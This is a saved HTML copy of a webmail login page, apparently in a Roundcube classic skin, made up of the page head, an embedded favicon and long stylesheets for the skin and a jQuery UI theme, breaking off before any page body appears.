<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" class=" js mozilla"><head>
<title>Webmail :: Welcome to Webmail</title>
<meta name="Robots" content="noindex,nofollow">
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
<link rel="index" href="./?_task=login">
<!--link rel="shortcut icon" href="skins/classic/images/favicon.ico"/-->
<link rel="shortcut icon" data-savepage-href="skins/default//images/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAwAAAAKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMAAABkCwkDyg8MB8oAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAIsZEQPjXz8J/7FyFf+LZiX/AwMAvwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAABLAAAArzEiBvh7Uw3/tHgS/8qCE//LeRT/uoIq/1tCC/8AAACYAAAAAAAAAAAAAAAAAAAAAwAAAGgNCQLSTjUJ/5dlD//CgBP/xoIT/755EP+9dA7/xHEM/7Z6J/+WbRP/RDIJ/wAAAG4AAAAAAAAAAAAAAD9CLAf/tXgR/8mFE//DgRP/u3kO/717D//DhRn/xYsl/8WONP++kUD/kHIg/4tnD/8qIAb6AAAASAAAAAAAAABbcUwL/9CIEv+/fRD/u3sO/8CJHv/Io0n/xa9p/72tcv+1p2z/sJlQ/6yGMP+RcBz/hGEP/xQPA+AAAAANAAAAbYBXD//Kihv/uYIf/7mUQf/GvJT/z828/9LRxv/QzsH/yca2/7i1ov+omW3/o30r/5hzHP8zJgX+AAAAMAAAAVtSOxP/onQa/5l0E//Fvp7/5+jp/+7v7v/z8/L/5uXj/97d2v/Q0c//tLa3/5aIVv+pgSD/WEUV/wAAAEsAAAACAAAAYRMMANdbShn/5OTa//Dw7//5+fj/+fn4/+/v7f/t7en/6+rm/8/Pzf+dln7/eFgL/0Q2FP8AAAE5AAAAAAAAAAAAAAAOAQMHwdTU1P//////6unm/+Xk4P/g4Nz/29vX/9nY1v/i4eD/kZCP/wAAAL8AAABMAAAABAAAAAAAAAAAAAAAAAAAAHKbm5v//////+Hg3//i4uH/4eHg/9nZ2f/Jycn/0dHR/25ubv8AAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIiIi3dfX1v/p6ej/4eDh/+fn5v/Y2Nj/0dHR/7GxsP8VFRXMAAAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADApKCnho6Oj/8/Ozv/V1dX/x8fH/5SUlP8fHx/XAAAAIwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAJolJSXcNzc36CQkJNkAAACTAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhAAAAXQAAAG4AAABbAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAA/x8AAP4P8L/4BwAAwAcAAAADAAAAAQAAAAAAAAAAAAAAAAAAAAAAAMAAAADgAwAA4AP///AH///4DwAA/B8AAA==">
<style data-savepage-href="skins/classic/common.min.css?s=1415172545" type="text/css">#accounts{font-size:11px;position:absolute;top:38px;right:20px;}#accounts a{font-size:11px;color:#666;padding-top:2px;padding-bottom:2px;padding-left:22px;text-decoration:none;}#accounts a:hover{color:#333;}#accounts select{font-size:11px;width:136px;}#accounts span.title{color:#666;}body{font-family:"Lucida Grande",Verdana,Arial,Helvetica,sans-serif;margin:8px;background-color:#f6f6f6;color:#000;font-size:12px}body.iframe{margin:20px 0 0 0;background-color:#FFF}body.extwin{margin:10px}select,input,textarea{font-size:12px;font-family:inherit}th{font-weight:normal}h3{font-size:18px}a,a:active,a:visited{color:#000;outline:0}a.button,a.button:visited,a.tab,a.tab:visited,a.axislist{color:#000;text-decoration:none}a.tab{width:80px;display:block;text-align:center}a.disabled{color:#999;text-decoration:none;cursor:default}hr{height:1px;background-color:#666;border-style:none}input[type="text"],input[type="button"],input[type="password"],textarea{border:1px solid #666;color:#333;background-color:#FFF}input,textarea{color:black;padding:1px 3px}input.placeholder,textarea.placeholder,input:-moz-placeholder,textarea:-moz-placeholder{color:#aaa}input.button{height:20px;color:#333;font-size:12px;padding-left:8px;padding-right:8px;background:/*savepage-url=images/buttons/bg.gif?v=30b2.196*/var(--savepage-url-5) repeat-x #f0f0f0;border:1px solid #a4a4a4}input.button:hover{color:black}input.button[disabled],input.button[disabled]:hover{color:#aaa;border-color:#ccc}input.mainaction{font-weight:bold;border:1px solid #999}img{border:0}.alttext{font-size:11px}.hint{color:#666;font-size:11px}.formlinks a,.formlinks a:visited{color:#c00;font-size:11px;text-decoration:none}.formlinks a.disabled,.formlinks a.disabled:visited{color:#999}label input,label span{vertical-align:middle}#mainscreen{position:absolute;top:85px;right:20px;bottom:20px;left:20px}.extwin #mainscreen{top:43px}body>#logo{margin-left:12px;cursor:pointer}#taskbar{position:absolute;top:0;right:0;height:24px;left:250px;background:/*savepage-url=images/taskbar.png?v=3878.1902*/url() top right no-repeat;padding:10px 6px 5px 0;text-align:right;white-space:nowrap;z-index:2}#taskbar a{font-size:11px;color:#666;text-decoration:none;padding:6px 12px 6px 26px;background:/*savepage-url=images/taskicons.gif?v=b8e0.1519*/url() no-repeat}#taskbar a:hover{color:#333}#taskbar a.button-mail{background-position:0 0}#taskbar a.button-addressbook{background-position:0 -25px}#taskbar a.button-settings{background-position:0 -50px}#taskbar a.button-logout{background-position:0 -75px}body>#message{position:absolute;display:none;top:-1px;margin-left:-225px;left:50%;z-index:5000;opacity:.85}body>#message div{width:400px;margin:0;min-height:22px;padding:8px 10px 8px 46px}body>#message div.notice,body>#messagebody .part-notice,#message-objects div.notice{background:/*savepage-url=images/display/icons.png?v=e866.4201*/url() 6px 3px no-repeat;background-color:#f7fdcb;border:1px solid #c2d071}body>#message div.error,body>#message div.warning,#message-objects div.warning,#message-objects div.error{background:/*savepage-url=images/display/icons.png?v=e866.4201*/url() 6px -97px no-repeat;background-color:#ef9398;border:1px solid #dc5757}body>#message div.confirmation,#message-objects div.confirmation{background:/*savepage-url=images/display/icons.png?v=e866.4201*/url() 6px -47px no-repeat;background-color:#a6ef7b;border:1px solid #76c83f}body>#message div.loading,#message-objects div.loading{background:/*savepage-url=images/display/loading.gif?v=9bae.2710*/url() 6px 3px no-repeat;background-color:#ebebeb;border:1px solid #ccc}body>#message a{cursor:pointer;text-decoration:underline}body.extwin #closelink{position:absolute;top:5px;right:20px;text-align:right;z-index:100}.box{border:1px solid #999}.boxtitle{height:12px !important;padding:2px 10px 5px 5px;border-bottom:1px solid #999;color:#333;font-size:11px;font-weight:bold;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis;white-space:nowrap;background:/*savepage-url=images/listheader.gif?v=ab42.314*/var(--savepage-url-4) top left repeat-x #CCC}.boxtitle .rightalign{float:right}body.iframe .boxtitle{position:fixed;top:0;left:0;width:100%}.boxcontent{padding:15px 10px 10px 10px;background-color:#f2f2f2}.boxcontent table td.title{color:#666;padding-right:10px}.boxlistcontent{position:absolute;top:20px;bottom:22px;left:0;right:0;width:100%;overflow-y:auto;overflow-x:hidden}.boxsubject{position:absolute;top:0;left:0;right:0;overflow:hidden;height:22px;border-bottom:1px solid #999;background:/*savepage-url=images/listheader.gif?v=ab42.314*/var(--savepage-url-4) top left repeat-x #CCC}.boxfooter{position:absolute;bottom:0;left:0;right:0;overflow:hidden;height:22px;border-top:1px solid #999;background:/*savepage-url=images/listheader.gif?v=ab42.314*/var(--savepage-url-4) top left repeat-x #CCC}.boxfooter a.button,.boxfooter a.buttonPas{display:block;float:left;width:34px;height:22px;padding:0;margin:0;overflow:hidden;background:/*savepage-url=images/icons/groupactions.png?v=ace6.1092*/url() 0 0 no-repeat transparent;opacity:.99}.boxfooter a.groupactions{background-position:0 -26px}.boxfooter a.delgroup{background-position:0 -49px}.boxfooter a.buttonPas{opacity:.35}.pagenav span{color:#444;font-size:11px;text-shadow:white 1px 1px;white-space:nowrap}.pagenav a.button,.pagenav a.buttonPas{display:block;float:left;width:11px;height:11px;padding:0;margin:1px;margin-top:2px;overflow:hidden;background:/*savepage-url=images/pagenav.gif?v=2e75.355*/url() 0 0 no-repeat transparent;opacity:.99}.pagenav a.buttonPas{opacity:.35}.pagenav a.firstpageSel{background-position:0 -11px}.pagenav a.prevpage{background-position:-11px 0}.pagenav a.prevpageSel{background-position:-11px -11px}.pagenav a.nextpage{background-position:-22px 0}.pagenav a.nextpageSel{background-position:-22px -11px}.pagenav a.lastpage{background-position:-33px 0}.pagenav a.lastpageSel{background-position:-33px -11px}.splitter{user-select:none;-moz-user-select:none;-khtml-user-select:none;position:absolute;background:/*savepage-url=images/dimple.png?v=42a0.158*/url() center no-repeat}.splitter-h{cursor:n-resize;cursor:row-resize;background-position:center 2px}.splitter-v{cursor:e-resize;cursor:col-resize;background-position:2px center}.popupmenu{position:absolute;top:32px;left:90px;width:auto;max-height:70%;overflow:-moz-scrollbars-vertical;overflow-y:auto;display:none;background-color:#fff;background-color:rgba(255,255,255,0.95);border:1px solid #999;padding:4px;z-index:240;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;box-shadow:1px 1px 12px #999;-moz-box-shadow:1px 1px 12px #999;-webkit-box-shadow:#999 1px 1px 12px}.popupmenu ul{margin:-4px 0;padding:0;list-style:none}.popupmenu ul li{font-size:11px;white-space:nowrap;min-width:100px;margin:3px -4px}.popupmenu li a,.popupmenu li label{display:block;color:#a0a0a0;padding:2px 16px 2px 10px;text-decoration:none;min-height:14px;background:transparent}.popupmenu li label.comment{color:#999;font-style:italic;padding-top:4px;padding-bottom:3px}.popupmenu li a.active,.popupmenu li a.active:active,.popupmenu li a.active:visited{color:#333;cursor:pointer}.popupmenu li a.active:hover,.popupmenu.selectable li a.selected:hover{color:#fff;background-color:#c00}.popupmenu li.block input{float:left}.popupmenu.selectable li a.selected{background:/*savepage-url=images/messageicons.png?v=9df0.3673*/url() 2px -372px no-repeat}.popupmenu.selectable li a{padding-left:20px}.darkbg{background-color:#f2f2f2 !important}.dropbutton,.dropbutton span{float:left;height:32px}.dropbutton span{width:9px;background:/*savepage-url=images/dbutton.png?v=7bba.240*/url() -53px 0 no-repeat transparent}.dropbutton span:hover{cursor:pointer;background-position:-74px 0}img.uploading{width:16px;height:16px}table.records-table thead tr td{height:20px;padding:0 4px 0 4px;vertical-align:middle;border-bottom:1px solid #999;color:#333;background:/*savepage-url=images/listheader.gif?v=ab42.314*/var(--savepage-url-4) top left repeat-x #CCC;font-size:11px;font-weight:bold}table.records-table tbody tr td{height:16px;padding:2px 4px 2px 4px;font-size:11px;white-space:nowrap;border-bottom:1px solid #ebebeb;overflow:hidden;text-align:left}table.records-table tr{background-color:#fff}table.records-table tr.selected td{color:#fff;background-color:#c33}table.records-table tr.unfocused td{color:#fff;background-color:#929292}ul.treelist li{position:relative}ul.treelist li div.treetoggle{position:absolute;left:8px !important;left:-16px;top:1px;width:14px;height:16px;cursor:pointer}ul.treelist li div.collapsed{background:/*savepage-url=images/icons/collapsed.png?v=45aa.97*/url() bottom right no-repeat}ul.treelist li div.expanded{background:/*savepage-url=images/icons/expanded.png?v=f647.107*/url() bottom right no-repeat}#quicksearchbar{position:absolute;top:55px;right:10px;width:190px;height:20px;text-align:right;background:/*savepage-url=images/searchfield.gif?v=aaf8.313*/url() top left no-repeat}#searchreset{position:absolute;top:3px;right:12px;text-decoration:none}#searchmenulink{position:absolute;top:3px;right:168px}#quicksearchbar img{vertical-align:middle}#quicksearchbox{position:absolute;top:2px;left:24px;width:140px;height:15px;font-size:11px;padding:0;border:0;outline:0}.propform div.prop{margin-bottom:.5em}.propform div.prop.block label{display:block;margin-bottom:2px}.propform div.prop.block input,.propform div.prop.block textarea{width:97%}#rcmversion{position:absolute;bottom:10px;right:20px;text-align:right;white-space:nowrap;font-size:8pt;color:#999}#rcmdraglayer{min-width:300px;width:auto !important;width:300px;border:1px solid #999;background-color:#fff;padding-left:8px;padding-right:8px;padding-top:3px;padding-bottom:3px;font-size:11px;white-space:nowrap;opacity:.82;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;box-shadow:1px 1px 12px #999;-moz-box-shadow:1px 1px 12px #999;-webkit-box-shadow:#999 1px 1px 12px}.draglayercopy:before{position:absolute;bottom:-5px;left:-6px;content:" ";width:14px;height:14px;background:/*savepage-url=images/messageactions.png?v=d93e.3223*/url() -2px -128px no-repeat}a.rcmContactAddress{text-decoration:none}a.rcmContactAddress:hover{text-decoration:underline}#rcmKSearchpane{background-color:#f9f9f9;border:1px solid #ccc}#rcmKSearchpane ul{margin:0;padding:2px;list-style-image:none;list-style-type:none}#rcmKSearchpane ul li{display:block;height:16px;font-size:11px;padding-left:6px;padding-top:2px;padding-right:6px;white-space:nowrap;cursor:pointer}#rcmKSearchpane ul li.selected{color:#fff;background-color:#c33}#login-form{margin-left:auto;margin-right:auto;margin-top:50px;width:400px;border:1px solid #999}#login-form table td.title{text-align:right;white-space:nowrap}#login-form table{width:1%;margin:auto}#login-form table td.input input{width:200px}#login-bottomline{width:400px;margin:5em auto;font-size:85%;text-align:center;color:#666}#login-noscriptwarning{margin:2em auto 0 auto;width:400px;color:#cf2734;font-weight:bold}#console{opacity:.8}.disabled,a.disabled{color:#999}font.bold{font-weight:bold}.formbuttons{text-align:center}ul.toolbarmenu{margin:-4px 0 -4px 0;padding:0;list-style:none}ul.toolbarmenu li{font-size:11px;white-space:nowrap;min-width:130px;margin:2px -4px}ul.toolbarmenu li a{display:block;color:#a0a0a0;padding:1px 12px 3px 28px;text-decoration:none;min-height:14px}ul.toolbarmenu li a.active,ul.toolbarmenu li a.active:active,ul.toolbarmenu li a.active:visited{color:#333}ul.toolbarmenu li input{vertical-align:middle}ul.toolbarmenu li hr{color:#ccc;width:130px;height:1px;margin:2px 1px 2px 1px}ul.toolbarmenu li img{float:left;margin:0 2px}div.popupmenu ul li.separator_below,ul.toolbarmenu li.separator_below{border-bottom:1px solid #ccc;margin-bottom:2px;padding-bottom:2px}div.popupmenu ul li.separator_above,ul.toolbarmenu li.separator_above{border-top:1px solid #ccc;margin-top:2px;padding-top:2px}#searchmenu{width:160px}#searchmenu ul.toolbarmenu{margin:0}#searchmenu ul.toolbarmenu li{margin:1px 4px 1px}#folder-selector li a{padding:0}#folder-selector li a span{background:/*savepage-url=images/icons/folders.png?v=d9d2.5356*/url() no-repeat 6px 0;display:block;height:15px;min-height:14px;padding:2px 4px 2px 28px;overflow:hidden;max-width:120px;text-overflow:ellipsis}#folder-selector li a.virtual{color:#a0a0a0}#folder-selector li a.active:hover span{color:white}#folder-selector li a.inbox span{background-position:6px -18px}#folder-selector li a.drafts span{background-position:6px -37px}#folder-selector li a.sent span{background-position:6px -54px}#folder-selector li a.trash span{background-position:6px -91px}#folder-selector li a.junk span{background-position:6px -73px}div.tabsbar,#tabsbar{position:absolute;top:50px;left:220px;right:20px;height:22px;border-bottom:1px solid #999;white-space:nowrap}div.tabsbar{top:35px;left:12px;right:12px}span.tablink,span.tablink-selected{float:left;height:23px !important;height:22px;overflow:hidden;background:/*savepage-url=images/tabs-left.gif?v=0541.219*/url() top left no-repeat}span.tablink{cursor:pointer}span.tablink-selected{cursor:default;background-position:0 -23px}span.tablink a,span.tablink-selected a{display:inline-block;padding:5px 10px 0 5px;margin-left:5px;height:23px;color:#555;max-width:185px;text-decoration:none;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis;background:/*savepage-url=images/tabs-right.gif?v=5414.733*/url() top right no-repeat}span.tablink-selected a{cursor:inherit;color:#000;background-position:right -23px}fieldset{margin-bottom:1em;border:1px solid #999;padding:4px 8px 9px 8px}legend{color:#999}fieldset.tabbed{margin-top:22px;padding-top:12px}.quota_text{text-align:center;font-size:10px;color:#666;border:1px solid #999;cursor:default}.quota_bg{background-color:white}.quota_high{background:/*savepage-url=images/quota-colors.png?v=c1e9.287*/url() repeat-x 0 -28px #f90509}.quota_mid{background:/*savepage-url=images/quota-colors.png?v=c1e9.287*/url() repeat-x 0 -14px #e3e909}.quota_low{background:/*savepage-url=images/quota-colors.png?v=c1e9.287*/url() repeat-x 0 0 #05f905}.quota_text_high{color:white}.quota_text_mid{color:#666}.quota_text_low{color:#666}#login-advice01{margin-left:auto;margin-right:auto;margin-top:30px;width:560px;border:1px solid #999;background:#fff;}.login_advice_boxcontent{padding:10px;}.login_advice_title{font-size:17px;font-weight:700;color:#fff;text-align:center;background:#c4c4c4;border-radius:5px;margin:0 0 10px;padding:4px 0;}.login_advice_01{text-align:center;margin:0 0 10px;padding:0;}.login_advice_content{border:5px solid #ffcbcb;border-radius:5px;padding:7px;}.title_icon{vertical-align:bottom;border:0;margin-right:5px;}.login_advice_content_title{background:/*savepage-url=./caution.png*/url() no-repeat left bottom;height:20px;font-size:17px;color:#e60012;font-weight:700;border-bottom:1px solid #e60012;margin:0 0 10px;padding:0 0 0 26px;}ol{padding-left:25px;padding-top:0;padding-bottom:0;margin:0;}ol li{line-height:180%;}</style>



<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<style data-savepage-href="plugins/jqueryui/themes/classic/jquery-ui-1.9.2.custom.css?s=1415172545" type="text/css">/*
 * jQuery UI CSS Framework 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Theming/API
 */

/* Layout helpers
----------------------------------*/
.ui-helper-hidden { display: none; }
.ui-helper-hidden-accessible { position: absolute !important; clip: rect(1px 1px 1px 1px); clip: rect(1px,1px,1px,1px); }
.ui-helper-reset { margin: 0; padding: 0; border: 0; outline: 0; line-height: 1.3; text-decoration: none; font-size: 100%; list-style: none; }
.ui-helper-clearfix:before, .ui-helper-clearfix:after { content: ""; display: table; }
.ui-helper-clearfix:after { clear: both; }
.ui-helper-clearfix { zoom: 1; }
.ui-helper-zfix { width: 100%; height: 100%; top: 0; left: 0; position: absolute; opacity: 0; filter:Alpha(Opacity=0); }


/* Interaction Cues
----------------------------------*/
.ui-state-disabled { cursor: default !important; }


/* Icons
----------------------------------*/

/* states and images */
.ui-icon { display: block; text-indent: -99999px; overflow: hidden; background-repeat: no-repeat; }


/* Misc visuals
----------------------------------*/

/* Overlays */
.ui-widget-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }


/*
 * jQuery UI CSS Framework 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Theming/API
 *
 * To view and modify this theme, visit http://jqueryui.com/themeroller/?ctl=themeroller&ctl=themeroller&ffDefault=Lucida%20Grande,%20Verdana,%20Arial,%20Helvetica,%20sans-serif&fwDefault=normal&fsDefault=1em&cornerRadius=0&bgColorHeader=f4f4f4&bgTextureHeader=04_highlight_hard.png&bgImgOpacityHeader=90&borderColorHeader=999999&fcHeader=333333&iconColorHeader=333333&bgColorContent=ffffff&bgTextureContent=01_flat.png&bgImgOpacityContent=75&borderColorContent=aaaaaa&fcContent=000000&iconColorContent=000000&bgColorDefault=e6e6e7&bgTextureDefault=04_highlight_hard.png&bgImgOpacityDefault=90&borderColorDefault=aaaaaa&fcDefault=000000&iconColorDefault=666666&bgColorHover=e6e6e7&bgTextureHover=04_highlight_hard.png&bgImgOpacityHover=90&borderColorHover=999999&fcHover=000000&iconColorHover=333333&bgColorActive=a3a3a3&bgTextureActive=04_highlight_hard.png&bgImgOpacityActive=90&borderColorActive=a4a4a4&fcActive=000000&iconColorActive=333333&bgColorHighlight=cc3333&bgTextureHighlight=01_flat.png&bgImgOpacityHighlight=90&borderColorHighlight=cc3333&fcHighlight=ffffff&iconColorHighlight=dddddd&bgColorError=fef1ec&bgTextureError=02_glass.png&bgImgOpacityError=95&borderColorError=cc3333&fcError=cc3333&iconColorError=cc3333&bgColorOverlay=aaaaaa&bgTextureOverlay=01_flat.png&bgImgOpacityOverlay=0&opacityOverlay=30&bgColorShadow=aaaaaa&bgTextureShadow=01_flat.png&bgImgOpacityShadow=0&opacityShadow=35&thicknessShadow=6px&offsetTopShadow=-6px&offsetLeftShadow=-6px&cornerRadiusShadow=6px
 */


/* Component containers
----------------------------------*/
.ui-widget { font-family: Lucida Grande, Verdana, Arial, Helvetica, sans-serif; font-size: 1em; }
.ui-widget .ui-widget { font-size: 1em; }
.ui-widget input, .ui-widget select, .ui-widget textarea, .ui-widget button { font-family: Lucida Grande, Verdana, Arial, Helvetica, sans-serif; font-size: 1em; }
.ui-widget-content { border: 1px solid #aaaaaa; background: #ffffff /*savepage-url=images/ui-bg_flat_75_ffffff_40x100.png*/ url() 50% 50% repeat-x; color: #000000; }
.ui-widget-content a { color: #000000; }
.ui-widget-header { border: 1px solid #999999; border-width: 0 0 1px 0; background: #f4f4f4 /*savepage-url=images/listheader.png*/ url() 50% 50% repeat; color: #333333; font-weight: bold; margin: -0.2em -0.2em 0 -0.2em; }
.ui-widget-header a { color: #333333; }

/* Interaction states
----------------------------------*/
.ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header .ui-state-default { border: 1px solid #aaaaaa; background: #e6e6e7 /*savepage-url=images/ui-bg_highlight-hard_90_e6e6e7_1x100.png*/ url() 50% 50% repeat-x; font-weight: normal; color: #000000; }
.ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited { color: #000000; text-decoration: none; }
.ui-state-hover, .ui-widget-content .ui-state-hover, .ui-widget-header .ui-state-hover, .ui-state-focus, .ui-widget-content .ui-state-focus, .ui-widget-header .ui-state-focus { border: 1px solid #999999; background: #e6e6e7 /*savepage-url=images/ui-bg_highlight-hard_90_e6e6e7_1x100.png*/ url() 50% 50% repeat-x; font-weight: normal; color: #000000; }
.ui-state-hover a, .ui-state-hover a:hover { color: #000000; text-decoration: none; }
.ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active { border: 1px solid #a4a4a4; background: #a3a3a3 /*savepage-url=images/ui-bg_highlight-hard_90_a3a3a3_1x100.png*/ url() 50% 50% repeat-x; font-weight: normal; color: #000000; }
.ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited { color: #000000; text-decoration: none; }
.ui-state-focus, .ui-widget-content .ui-state-focus { border: 1px solid #c33; color: #a00; }
.ui-tabs-nav .ui-state-focus { border: 1px solid #a4a4a4; color: #000000; }
.ui-widget :active { outline: none; }

/* Interaction Cues
----------------------------------*/
.ui-state-highlight, .ui-widget-content .ui-state-highlight, .ui-widget-header .ui-state-highlight  {border: 1px solid #cc3333; background: #cc3333 /*savepage-url=images/ui-bg_flat_90_cc3333_40x100.png*/ url() 50% 50% repeat-x; color: #ffffff; }
.ui-state-highlight a, .ui-widget-content .ui-state-highlight a,.ui-widget-header .ui-state-highlight a { color: #ffffff; }
.ui-state-error, .ui-widget-content .ui-state-error, .ui-widget-header .ui-state-error {border: 1px solid #cc3333; background: #fef1ec /*savepage-url=images/ui-bg_glass_95_fef1ec_1x400.png*/ url() 50% 50% repeat-x; color: #cc3333; }
.ui-state-error a, .ui-widget-content .ui-state-error a, .ui-widget-header .ui-state-error a { color: #cc3333; }
.ui-state-error-text, .ui-widget-content .ui-state-error-text, .ui-widget-header .ui-state-error-text { color: #cc3333; }
.ui-priority-primary, .ui-widget-content .ui-priority-primary, .ui-widget-header .ui-priority-primary { font-weight: bold; }
.ui-priority-secondary, .ui-widget-content .ui-priority-secondary,  .ui-widget-header .ui-priority-secondary { opacity: .6; filter:Alpha(Opacity=60); font-weight: normal; }
.ui-state-disabled, .ui-widget-content .ui-state-disabled, .ui-widget-header .ui-state-disabled { opacity: .35; filter:Alpha(Opacity=35); background-image: none; }

/* Icons
----------------------------------*/

/* states and images */
.ui-icon { width: 16px; height: 16px; background-image: /*savepage-url=images/ui-icons_000000_256x240.png*/ url(); }
.ui-widget-content .ui-icon {background-image: /*savepage-url=images/ui-icons_000000_256x240.png*/ url(); }
.ui-widget-header .ui-icon {background-image: /*savepage-url=images/ui-icons_333333_256x240.png*/ url(); }
.ui-state-default .ui-icon { background-image: /*savepage-url=images/ui-icons_666666_256x240.png*/ url(); }
.ui-state-hover .ui-icon, .ui-state-focus .ui-icon {background-image: /*savepage-url=images/ui-icons_333333_256x240.png*/ url(); }
.ui-state-active .ui-icon {background-image: /*savepage-url=images/ui-icons_333333_256x240.png*/ url(); }
.ui-state-highlight .ui-icon {background-image: /*savepage-url=images/ui-icons_dddddd_256x240.png*/ url(); }
.ui-state-error .ui-icon, .ui-state-error-text .ui-icon {background-image: /*savepage-url=images/ui-icons_cc3333_256x240.png*/ url(); }

/* positioning */
.ui-icon-carat-1-n { background-position: 0 0; }
.ui-icon-carat-1-ne { background-position: -16px 0; }
.ui-icon-carat-1-e { background-position: -32px 0; }
.ui-icon-carat-1-se { background-position: -48px 0; }
.ui-icon-carat-1-s { background-position: -64px 0; }
.ui-icon-carat-1-sw { background-position: -80px 0; }
.ui-icon-carat-1-w { background-position: -96px 0; }
.ui-icon-carat-1-nw { background-position: -112px 0; }
.ui-icon-carat-2-n-s { background-position: -128px 0; }
.ui-icon-carat-2-e-w { background-position: -144px 0; }
.ui-icon-triangle-1-n { background-position: 0 -16px; }
.ui-icon-triangle-1-ne { background-position: -16px -16px; }
.ui-icon-triangle-1-e { background-position: -32px -16px; }
.ui-icon-triangle-1-se { background-position: -48px -16px; }
.ui-icon-triangle-1-s { background-position: -64px -16px; }
.ui-icon-triangle-1-sw { background-position: -80px -16px; }
.ui-icon-triangle-1-w { background-position: -96px -16px; }
.ui-icon-triangle-1-nw { background-position: -112px -16px; }
.ui-icon-triangle-2-n-s { background-position: -128px -16px; }
.ui-icon-triangle-2-e-w { background-position: -144px -16px; }
.ui-icon-arrow-1-n { background-position: 0 -32px; }
.ui-icon-arrow-1-ne { background-position: -16px -32px; }
.ui-icon-arrow-1-e { background-position: -32px -32px; }
.ui-icon-arrow-1-se { background-position: -48px -32px; }
.ui-icon-arrow-1-s { background-position: -64px -32px; }
.ui-icon-arrow-1-sw { background-position: -80px -32px; }
.ui-icon-arrow-1-w { background-position: -96px -32px; }
.ui-icon-arrow-1-nw { background-position: -112px -32px; }
.ui-icon-arrow-2-n-s { background-position: -128px -32px; }
.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }
.ui-icon-arrow-2-e-w { background-position: -160px -32px; }
.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }
.ui-icon-arrowstop-1-n { background-position: -192px -32px; }
.ui-icon-arrowstop-1-e { background-position: -208px -32px; }
.ui-icon-arrowstop-1-s { background-position: -224px -32px; }
.ui-icon-arrowstop-1-w { background-position: -240px -32px; }
.ui-icon-arrowthick-1-n { background-position: 0 -48px; }
.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }
.ui-icon-arrowthick-1-e { background-position: -32px -48px; }
.ui-icon-arrowthick-1-se { background-position: -48px -48px; }
.ui-icon-arrowthick-1-s { background-position: -64px -48px; }
.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }
.ui-icon-arrowthick-1-w { background-position: -96px -48px; }
.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }
.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }
.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }
.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }
.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }
.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }
.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }
.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }
.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }
.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }
.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }
.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }
.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }
.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }
.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }
.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }
.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }
.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }
.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }
.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }
.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }
.ui-icon-arrow-4 { background-position: 0 -80px; }
.ui-icon-arrow-4-diag { background-position: -16px -80px; }
.ui-icon-extlink { background-position: -32px -80px; }
.ui-icon-newwin { background-position: -48px -80px; }
.ui-icon-refresh { background-position: -64px -80px; }
.ui-icon-shuffle { background-position: -80px -80px; }
.ui-icon-transfer-e-w { background-position: -96px -80px; }
.ui-icon-transferthick-e-w { background-position: -112px -80px; }
.ui-icon-folder-collapsed { background-position: 0 -96px; }
.ui-icon-folder-open { background-position: -16px -96px; }
.ui-icon-document { background-position: -32px -96px; }
.ui-icon-document-b { background-position: -48px -96px; }
.ui-icon-note { background-position: -64px -96px; }
.ui-icon-mail-closed { background-position: -80px -96px; }
.ui-icon-mail-open { background-position: -96px -96px; }
